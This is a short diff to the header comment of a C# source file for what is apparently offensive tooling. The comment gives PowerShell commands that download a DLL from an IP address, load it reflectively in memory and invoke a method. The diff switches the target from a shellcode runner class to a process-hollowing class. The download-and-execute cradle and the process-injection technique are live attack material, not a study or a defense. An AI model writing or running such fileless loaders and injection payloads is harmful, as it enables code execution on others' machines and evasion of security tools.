@@ -1,9 +1,18 @@
 // Reflective loading with:
+// # Download the DLL from the URL
 // $data = (New-Object System.Net.WebClient).DownloadData('http://10.100.102.30/run.dll')
+
+// # Load the assembly from the downloaded data
 // $assem = [System.Reflection.Assembly]::Load($data)
-// $class = $assem.GetType("ShellcodeRunner.Program")
-// $method = $class.GetMethod("Run")
-// $method.Invoke(0, $null)
+
+// # Get the type of the class containing the method
+// $class = $assem.GetType("ProcessHollowingDLL.ProcessHollowing")  # Adjust the type name accordingly
+
+// # Get the method you want to invoke
+// $method = $class.GetMethod("PerformProcessHollowing")  # Ensure method name matches
+
+// # Invoke the method with no parameters
+// $method.Invoke($null, $null)
 
 using System;
 using System.Runtime.InteropServices;
